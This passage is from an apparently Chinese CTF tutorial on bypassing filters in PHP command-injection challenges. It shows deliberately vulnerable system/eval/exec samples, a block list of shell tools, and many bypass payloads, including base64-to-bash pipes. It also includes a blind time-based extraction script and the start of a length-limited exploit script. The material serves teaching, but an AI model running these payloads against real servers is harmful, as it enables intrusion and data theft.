class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;# #&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;过滤后的命令：&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&lt;/br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;命令执行结果如下：&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>preg_replace</code>会把所有的空格替换成空，也就是函数所有的空格都会剔除。这种的绕过方式有很多种，这里简单列举一些常用的<code>&#123;cat,/flag&#125;</code>、<code>cat$IFS/flag</code>、<code>cat$&#123;IFS&#125;/flag</code>、<code>cat$IFS$9/flag</code>，这些<code>$</code>相关的都是linux内置的一些环境变量，都可以代表空格来用，然后$IFS是不可以直接在终端中当作空格使用的，原因是因为没有界定符，例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$IFScmd</span>.sh</span><br></pre></td></tr></table></figure><p>他会把IFScmd都当作环境变量，具体就可以采用<code>$&#123;IFS&#125;</code>来解决，然后后面加一个<code>$9</code>的作用也可以理解为做一个变量的分割。然后重定向可以用来空格绕过，例如<code>cat&lt;/flag</code>、<code>cat&lt;&gt;/flag</code>，具体就是把文件输出给命令，不多说了可以自己多试试。除去上面的还有通过URL编码的绕过，具体就是采用<code>%09</code>代表的是tab键，本身tab敲出来也会是一个长空格所以也可以，然后<code>%20</code>不一定行，因为它本身就是空格，有些题目也可以绕过。简单汇总一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">cat</span>,/flag&#125;</span><br><span class="line"><span class="built_in">cat</span><span class="variable">$IFS</span>/flag</span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/flag</span><br><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9</span>/flag</span><br><span class="line"><span class="built_in">cat</span>&lt;/flag</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;/flag</span><br><span class="line"><span class="built_in">cat</span>%09/flag</span><br><span class="line"><span class="built_in">cat</span>%20/flag</span><br></pre></td></tr></table></figure><h1 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;命令有问题哦，来黑我丫！！！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的函数不多说了，可以直接用其他的命令执行函数，主要是flag看不了，第一种方法添加<code>?</code>，例如<code>cat /fla?</code>、<code>/bin/ca? /?la?</code>，这算Linux的一个语法糖了。第二种就是引号绕过<code>cat /f&#39;&#39;lag</code>、<code>cat /f&quot;&quot;lag</code>单双引号都可以，对于linux来说双引号单引号就是可以代表拼接一下。第三种反斜杠<code>\</code>，他一般用来当作转义符，但是直接运行在linux中他的含义是拼接符，就是可以用来换行敲命令的一个符号，换行自动拼接，也可以用到这里<code>cat /fla\g</code>、<code>cat /f\la\g</code>，这个相当于这样运行的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /fla\</span><br><span class="line">g</span><br><span class="line"><span class="built_in">cat</span> /f\</span><br><span class="line">la\</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p>第四种是可以通过特殊的环境变量来是实现，例如<code>$1</code>到<code>$9</code>都可以尝试，还有<code>$@</code>、<code>$*</code>等等…第五种可以通过内联执行的方式去运行，例如<code>a=f;d=ag;c=l;cat /$a$c$d</code>，实际就是执行的<code>cat /flag</code>。第六种依旧是通过环境变量，参考我的PATH环境，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/root/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/usr/lib/wsl/lib:/mnt/d/VMware Workstation/bin/:/mnt/c/Windows/system32:/mnt/c/Windows:/mnt/c/Windows/System32/Wbem:/mnt/c/Windows/System32/WindowsPowerShell/v1.0/:/mnt/c/Windows/System32/OpenSSH/:/mnt/d/Microsoft VS Code/bin:/mnt/c/Program Files/dotnet/:/mnt/e/Environment/miniconda3/condabin:/mnt/d/Git/cmd:/mnt/c/Program Files/WireGuard/:/mnt/e/Environment/jdk-17.0.0.1/bin:/mnt/e/Environment/go-v1.24.2/bin:/mnt/c/Users/BoyChai/go/bin:/mnt/e/Other/Bin:/mnt/e/Environment/msys64:/mnt/e/Environment/msys64/mingw64/bin:/mnt/e/Environment/node-v22.15.0-win-x64:/mnt/d/Tencent/微信web开发者工具/dll:/mnt/d/Tools/QtScrcpy-win-x64-v3.2.0:/mnt/d/Wireshark:/mnt/c/Users/BoyChai/AppData/Local/Microsoft/WindowsApps:/mnt/d/Tools/Fiddler:/mnt/d/Lens/resources/cli/bin:/mnt/c/Users/BoyChai/AppData/Local/Muse Hub/lib:/root/.dotnet/tools</span><br></pre></td></tr></table></figure><p>里面可能能频出一个flag，我们把字符挨个提取出来，例如这样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="variable">$&#123;PATH:326:1&#125;</span><span class="variable">$&#123;PATH:31:1&#125;</span><span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:92:1&#125;</span></span><br><span class="line">flag</span><br></pre></td></tr></table></figure><p>也可以具体就是从第几个开始的第几个。第七种方式就是base64，例如下面几种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`<span class="built_in">echo</span> Y2F0IC9mbGFn |<span class="built_in">base64</span> -d`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d|bash</span><br></pre></td></tr></table></figure><p>下面汇总一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /fla?</span><br><span class="line">/bin/ca? /?la?</span><br><span class="line"><span class="built_in">cat</span> /f<span class="string">&#x27;&#x27;</span>lag</span><br><span class="line"><span class="built_in">cat</span> /f<span class="string">&quot;&quot;</span>lag</span><br><span class="line"><span class="built_in">cat</span> /fla\g</span><br><span class="line"><span class="built_in">cat</span> /f\la\g</span><br><span class="line"><span class="built_in">cat</span> /f<span class="variable">$&#123;1&#125;</span>lag</span><br><span class="line"><span class="built_in">cat</span> a=f;d=ag;c=l;<span class="built_in">cat</span> /$a$c<span class="variable">$d</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:326:1&#125;</span><span class="variable">$&#123;PATH:31:1&#125;</span><span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:92:1&#125;</span> <span class="comment"># 需要根据环境变量自己拼</span></span><br><span class="line">`<span class="built_in">echo</span> Y2F0IC9mbGFn |<span class="built_in">base64</span> -d`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d|bash</span><br></pre></td></tr></table></figure><h1 id="文件读取绕过"><a href="#文件读取绕过" class="headerlink" title="文件读取绕过"></a>文件读取绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell|\&#x27;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种是限制了传入时的一些查看文件的命令，替代品有很多，第一种<code>tac</code>是反向显示文件内容，<code>cat</code>是正向他是反向。第二种<code>more</code>也可以，他也是一个查看文件内容的命令。第三种<code>less</code>和more差不多。第四种<code>tail</code>查看末尾几行数据。第五种<code>nl</code>显示的时候顺便输出行号，和cat几乎一样，只是多一个行号的显示。第六种<code>od</code>按照二进制的形式读取文件。第七种<code>xxd</code>读取二进制文件。第八种<code>sort</code>，用来排序的也可以用来展示数据内容。第九种<code>uniq</code>去除重复内容的，或者统计。第十种<code>file -f</code>这个会报错出具体的文本内容。第十一种<code>grep</code>查找字符串，不加内容和cat差不多。上面这些都是通过命令，这里依旧可以通过base64的形式绕过，例如<code>echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash</code>。下面汇总一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tac</span>、more、less、<span class="built_in">tail</span>、<span class="built_in">nl</span>、<span class="built_in">od</span>、xxd、<span class="built_in">sort</span>、<span class="built_in">uniq</span>、file -f、grep......</span><br><span class="line">`<span class="built_in">echo</span> Y2F0IC9mbGFn |<span class="built_in">base64</span> -d`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d|bash</span><br></pre></td></tr></table></figure><h1 id="编码解码绕过"><a href="#编码解码绕过" class="headerlink" title="编码解码绕过"></a>编码解码绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例题依旧采用文件读取绕过的那道题目，很多情况都可以通过当前办法进行绕过，在文件名字那的时候就已经尝试使用base64的形式绕过，这里多说一些，如果题目直接就是次啊用eval的形式，那么就说明咱们可以通过php代码进行绕过，例如上面函数限制绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;syste%256d(%27dir%27);&quot;</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(%<span class="number">22</span>c3lzdGVtKCdkaXInKTs=%<span class="number">22</span>));</span><br><span class="line"><span class="comment"># base64</span></span><br><span class="line">`<span class="keyword">echo</span> Y2F0IC9mbGFn |base64 -d`</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash</span><br><span class="line"><span class="comment"># base32</span></span><br><span class="line"><span class="keyword">echo</span> MNQXIIBPMZWGCZY=|base32 -d |bash</span><br><span class="line"><span class="comment"># hex 有些可能没有xxd命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">636174202</span>f666c6167 |xxd -r -p|bash</span><br><span class="line">printf <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span> |bash</span><br><span class="line"><span class="comment"># python 一般linux环境都会带有，python的操作空间很大，自己家xor、编码都可以</span></span><br><span class="line">python -c <span class="string">&quot;with open(&#x27;/flag&#x27;, &#x27;r&#x27;) as f: content = f.read(); print(content)&quot;</span></span><br><span class="line">python3 -c <span class="string">&quot;import os; content = os.popen(&#x27;cat /flag&#x27;).read(); print(content)&quot;</span></span><br></pre></td></tr></table></figure><p>如果我们可以直接拿到eval的内容控制，那么解法就会非常多，你可以自己写一个xor异或去执行解码，等等…</p><h1 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>采用exec去执行的，并且不输出内容，这里就是不回显的，需要进行盲注，具体可以利用的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> &#123;<span class="keyword">time</span> s&#125; <span class="comment"># 命令拼接数字，单位是秒，延迟多少秒 </span></span><br><span class="line">awk &#123;NR=*&#125;     <span class="comment"># awk NR==1 代表读取第一行</span></span><br><span class="line"><span class="built_in">cut</span> -c         <span class="comment"># cut -c1 表示读取当前行的第1个字符</span></span><br></pre></td></tr></table></figure><p>可以根据上面语句进行编写shell脚本，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> flag.php | awk NR==1 | <span class="built_in">cut</span> -c1` == f ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>如果flag.php的第一行的第一个字符是’f’那么就延时2秒返回，我们可以通过http返回相应的时间来判断是否成功，具体就可以编写出下面python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://localhost/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="comment">#ascii挨个遍历爆破</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="comment">#time.sleep(0.1)</span></span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if [ `cat flag.php | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p>思路就是爆破5行，然后一行爆破55个，每次都从ASCII的32开始到128结束，具体延时2秒，如果1.5秒还没回显那么说明成功，追加到输出中，脚本可以自己根据情况进行修改。</p><h1 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h1><p>长度绕过这里说两个比较典型的，首先是7位长度的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\*|\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是4为长度的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他们两个都不会回显数据，比较通用的思路如下<br>按照命令<code>cat flag</code>为例子，他是8个字符，如果想要长度不能超过7的方式去执行，那么可以执行下面命令来绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;fl\\</span><br><span class="line">&gt;<span class="string">&quot;t \\&quot;</span></span><br><span class="line">&gt;ca\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><p>前面的<code>&gt;xxx</code>是为了创建文件，然后<code>\\</code>用作转义我们可以看看<code>ls -t</code>命令的回显，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿BoyChaiWindows)-[~/temp/test]</span><br><span class="line">└─# <span class="built_in">ls</span> -t</span><br><span class="line"> flag   a  <span class="string">&#x27;ca\&#x27;</span>  <span class="string">&#x27;t \&#x27;</span>  <span class="string">&#x27;fl\&#x27;</span>   ag</span><br></pre></td></tr></table></figure><p>a文件内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿BoyChaiWindows)-[~/temp/test]</span><br><span class="line">└─# <span class="built_in">cat</span> a</span><br><span class="line">a</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag</span><br></pre></td></tr></table></figure><p>它通过<code>\</code>去换行继续输出命令，最终实际执行的内容就是<code>cat flag</code>，上面的操作因为需要执行<code>ls -t&gt;a</code>所以只能在长度等于或者大于7的时候使用，然后因为是创建文件的形式，所有的都无法去直接查看<code>/</code>下的内容，我们可以采用反弹shell的形式去查看，这里给出两个exp，分别是长度为5和长度为4的时候的解决办法，5的是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.1.6:19080/class09/3/index.php?cmd=&quot;</span></span><br><span class="line">s = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件_</span></span><br><span class="line"><span class="keyword">list</span>=[</span><br><span class="line">    <span 